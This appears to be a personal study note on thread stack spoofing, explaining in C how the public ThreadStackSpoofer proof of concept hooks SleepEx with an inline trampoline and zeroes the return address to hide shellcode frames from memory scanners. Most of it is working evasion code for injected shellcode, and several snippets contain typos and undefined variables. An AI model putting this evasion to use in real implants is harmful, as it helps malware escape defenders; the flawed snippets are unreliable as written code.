---
publish: true
title: Thread Stack Spoofing
created: 2026-04-05T12:07:32.991+05:30
tags:
  - CreateFile
  - GetFileSize
  - ReadFile
  - memcpy
  - VirtualProtect
  - NtFlushInstructionCache
  - CloseHandle
  - VirtualAlloc
  - CreateThread
  - WaitForSingleObject
---

## Observation

It was created to bypass thread-based memory examination. It is done by hooking the functions we would like to call (by prepending a trampoline)

## Preliminaries

If you're following [this PoC](https://github.com/mgeeky/ThreadStackSpoofer), then certain structures and typedefs that can be defined for our convenience

```c
typedef void (WINAPI* typeSleep)(
	DWORD dwMilis
);

typedef DWORD(NTAPI* typeNtFlushInstructionCache)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	ULONG NumberOfBytesToFlush
);

typedef std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&::CloseHandle)> HandlePtr;
```

```c
struct HookedSleep
{
	typeSleep origSleep;
	BYTE sleepStub[16];
};

struct HookTrampolineBuffers
{
	//  (Input) Buffer containing bytes that should be restored while unhooking.
	BYTE* originalBytes;
	DWORD originalBytesSize;
	
	//  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
	BYTE* previousBytes;
	DWORD previousBytesSize;	
};
```

## Working

"addr" is the address of our defined function, which does the following:

```c
void WINAPI MySleep(DWORD dwMilliseconds)
{
	//
	// Locate this stack frame's return address
	//
	auto overwrite = (PULONG_PTR)_AddressOfReturnAddress();
	const auto origReturnAddress = *overwrite;
	
	log("[>] Original return address: 0x",
		std::hex,
		std::setw(8),
		std::setfill('0'),
		originalReturnAddress,
		". Finishing call stack"
	);
	
	//  By overwriting the return address with 0, we're basically telling call stack unwinding algorithm to stop unwinding call stack any further, as there are further frames. This we can hide our remaining stack frames referencing shellcode memory allocation from residing on a call stack.
	*overwrite = 0;
	
	log("\n===> Mysleep(", std::dec, dwMilliseconds, ")\n);
	
	//
	//  Perform sleep emulating originally hooked functionality.
	//
	::SleepEx(dwMilliseconds, false);
	
	//
	//  Restore original thread's call stack.
	//
	log("[<] Restoring original return address...");
	*overwrite = origReturnAddress;
}
```

"addr" will be added to the "trampoline" here:

```c
bool fastTrampoline(bool installHook, BYTE* addressToHook, LPVOID jumpAddress, HookTrampolineBuffers* buffers /*= NULL*/)
{
	#ifdef _WIN64
	uint8_t trampoline[] = {
		0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //  The 0x00 bytes is "addr"
        0x41, 0xFF, 0xE2
	};
	uint64_t addr = (uint64_t)(jumpAddress);
	memcpy(&trampoline[2], &addr, sizeof(addr));
	#else
	uint8_t trampoline[] = {
		0xB8, 0x00, 0x00, 0x00, 0x00,  //  0x00 bytes is "addr"
		0xFF, 0xE0
	};
	
	uint32_t addr = (uint32_t)(jumpAddress);
	memcpy(&trampoline[1], &addr, sizeof(addr));
	#endif
	
	//...
```

And then this "trampoline" will be prepended to the WinAPI function that we want to hook. In this example, we are hooking the `SleepEx` function.

```c
	//continued
	if(installHook)
	{
		if(buffers != NULL)  //  if buffers is empty, we will store the original bytes before we hook the function, so that we can restore it later.
		{
			if(buffers->previousBytes == nullptr || buffers->previousBytes == 0)
				return false;
				
			memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
		}
		
		if(::VirtualProtect(
			addressToHook,
			dwSize,
			PAGE_EXECUTE_READWRITE,
			&oldProt
		))
		{
			memcpy(addressToHook, trampoline, dwSize);
			output = true;
		}
	}
	
	//  or else we do the opposite; copy the originalBytes to addressToHook
	// <...>
```

We also apparently need to flush the instructions cache just in case our hook didn't kick in immediately (?), and then we run `VirtualProtect` again with the same permissions.

```c
	//  continued
	if(pNtFlushInstructionCache)
		pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize);
		
	::VirtualProtect(
		addressToHook,
		dwSize,
		oldProt,
		&oldProt
	);
	return output;
}
```

The rest is just functionality and semantics where the structures are initialized, typedefs are reinterpreted and these functions are called. Moreover, it reads shellcode using which it performs [classic-code-injection-local-process](process-injection-techniques/classic-code-injection-local-process.md) (although any technique can be used in conjunction with hooking). The shellcode, if it uses `SleepEx`, will end up passing through our trampoline to a local function (MySleep) that we defined.

We can add such trampolines to any other Windows API function and redirect execution to our local implementation of it.
